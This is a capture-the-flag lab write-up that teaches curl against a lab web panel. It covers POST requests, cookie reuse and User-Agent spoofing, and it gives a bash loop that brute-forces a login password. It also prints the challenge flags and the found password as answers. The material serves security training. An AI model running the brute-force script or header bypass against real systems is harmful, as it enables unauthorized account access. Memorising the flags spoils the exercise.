# Exploitation with cURL - Hoperation Eggsploit

The evil Easter bunnies operate a web control panel that holds the wormhole open. Using cURL, identify the endpoints, send the required requests, and shut the wormhole once and for all.

## Solution:

### Task 1: Introduction & Setup
- Started the AttackBox and target machine
- The challenge focuses on using cURL to interact with web applications directly from the command line
- No GUI tools like Burp Suite or browsers are available - only terminal access

### Task 2: Basic cURL Operations

**Step 1: Making a simple GET request**

First, I sent a basic HTTP GET request to see the homepage:

```
curl http://10.49.138.162/
```

This returns the HTML content of the page in the terminal.

**Step 2: POST Request - Question 1**

To send login credentials via POST request:

```
curl -X POST -d "username=admin&password=admin" http://10.49.138.162/post.php
```

Output:
```
THM{curl_post_success}
```

- The `-X POST` flag specifies the POST method
- The `-d` flag sends data in URL-encoded format

**Step 3: Cookie Management - Question 2**

First, save the cookies from the login:

```
curl -c cookies.txt -d "username=admin&password=admin" http://10.49.138.162/cookie.php
```

Then reuse the saved cookies:

```
curl -b cookies.txt http://10.49.138.162/cookie.php
```

Output:
```
THM{session_cookie_master}
```

- The `-c` flag saves cookies to a file
- The `-b` flag reads and sends cookies from a file

**Step 4: Brute Force Attack - Question 3**

Created a password wordlist:

```
nano passwords.txt
```

Added these passwords:
```
admin123
password
letmein
secretpass
secret
```

Created a bash script (`loop.sh`):

```
for pass in $(cat passwords.txt); do
  echo "Trying password: $pass"
  response=$(curl -s -X POST -d "username=admin&password=$pass" http://10.49.138.162/bruteforce.php)
  if echo "$response" | grep -q "Welcome"; then
    echo "[+] Password found: $pass"
    break
  fi
done
```

Made it executable and ran it:

```
chmod +x loop.sh
./loop.sh
```

Output:
```
Trying password: admin123
Trying password: password
Trying password: letmein
Trying password: secretpass
[+] Password found: secretpass
```

**Step 5: User-Agent Spoofing - Question 4**

Changed the User-Agent header to bypass filtering:

```
curl -A "TBFC" http://10.49.138.162/agent.php
```

Output:
```
THM{user_agent_filter_bypassed}
```

- The `-A` flag sets a custom User-Agent string
- Some web applications block default cURL User-Agent strings

## Flags:

**Question 1:**
```
THM{curl_post_success}
```

**Question 2:**
```
THM{session_cookie_master}
```

**Question 3:**
```
secretpass
```

**Question 4:**
```
THM{user_agent_filter_bypassed}
```

## Concepts learnt:

- **HTTP Methods:** GET requests retrieve data, POST requests submit data to the server
- **URL Encoding:** Form data is sent in `key=value` pairs, connected by `&` symbols
- **Session Management:** Web applications use cookies to maintain user sessions across multiple requests
- **Cookie Handling in cURL:** Unlike browsers, cURL requires manual cookie management using `-c` (save) and `-b` (send) flags
- **Brute Force Attacks:** Automated scripts can systematically try multiple credentials against login endpoints
- **User-Agent Headers:** HTTP headers that identify the client application making the request
- **Header Manipulation:** Modifying headers like User-Agent can bypass basic security filters

## Notes:

- The `-s` flag in cURL runs in silent mode (no progress bar), useful for scripting
- The `-i` flag shows response headers, helpful for debugging
- Real-world brute force tools like Hydra, Burp Intruder, and WFuzz work on similar principles
- Always use proper authorization before performing security testing
- The challenge demonstrates that security controls relying only on client-side checks (like User-Agent) are easily bypassed
- For the bonus mission, the hint mentions using rockyou.txt wordlist and a PIN between 4000-5000
